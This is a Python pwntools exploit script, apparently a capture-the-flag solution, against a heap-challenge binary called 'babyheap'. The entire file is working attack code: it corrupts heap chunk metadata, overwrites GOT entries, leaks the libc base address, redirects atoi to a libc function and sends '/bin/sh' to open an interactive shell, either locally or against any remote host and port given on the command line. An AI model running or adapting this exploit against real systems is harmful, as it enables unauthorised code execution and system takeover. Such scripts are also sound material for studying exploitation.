#!/usr/bin/env python

from pwn import *
import sys, os

def anew(size, content, name):
    r.sendline('1')
    r.sendafter(' :', str(size))
    r.sendafter(':', content)
    r.sendafter(':', name)
    r.recvuntil(':')

def edit(content):
    r.sendline('3')
    r.sendafter(':', content)
    r.recvuntil(':')

def delete():
    r.sendline('2')
    data = r.recvuntil(':')
    return data

def loop():
    r.sendline('4')
    r.sendlineafter('(Y/n)', 'n'*0xfe8+p64(0x61))
    r.recvuntil(':')

def exploit(r):
    r.recvuntil(':')
    loop()

    e = ELF('./babyheap')
    main = 0x400C9E

    payload  = p64(0)*3
    payload += p64(0x21)
    payload += payload * 4
    payload += p64(0)*3
    payload += p64(0x51)
    payload += p64(0)*3
    anew(len(payload), payload, 'B'*8)

    delete()

    payload  = p64(0)*3
    payload += p64(0x21)
    payload += p64(0x200)
    payload += p64(0x41414141)
    payload += p64(e.got['printf'])
    anew(0x50, payload, 'BBBB')
    pause()
    '''
    pause()
    payload  = p64(e.plt['puts']+6)
    payload += p64(e.plt['_exit']+6)
    payload += p64(e.plt['__read_chk']+6)
    payload += p64(e.plt['puts']+6)
    payload += p64(0x41414141)
    '''
    payload  = p64(e.plt['puts']+6)
    payload += p64(e.plt['alarm']+6)
    payload += p64(e.plt['read']+6)
    payload += p64(0x43434343)
    payload += p64(e.plt['signal']+6)
    payload += p64(e.plt['malloc']+6)
    payload += p64(e.plt['puts']+6)
    payload += p64(e.plt['atoi']+6)
    payload += p64(main)
    payload += p64(0)*2
    payload += p64(e.got['free'])
    payload += p32(0)
    payload += p32(0xffffffff)
    payload += p64(0)
    payload += p64(0x6020b8)
    payload += p64(0x200)
    payload += p64(0)
    payload += p64(e.got['atoi'])
    payload += 'A'*0x100
    edit(payload)


    r.sendline('4')
    r.recvuntil(')\n')
    libc_base = u64(r.recv(6).ljust(8, '\0')) - 0x83a70 # - 0x83940
    log.info("libc_base: " + hex(libc_base))
    r.recvuntil(':')

    pause()
    edit(p64(libc_base + 0x45380))# 0x45390))

    r.sendline('/bin/sh\x00')

    r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['./babyheap'], env={"LD_PRELOAD":"./libc-2.23.so"})
        print util.proc.pidof(r)
        pause()
        exploit(r)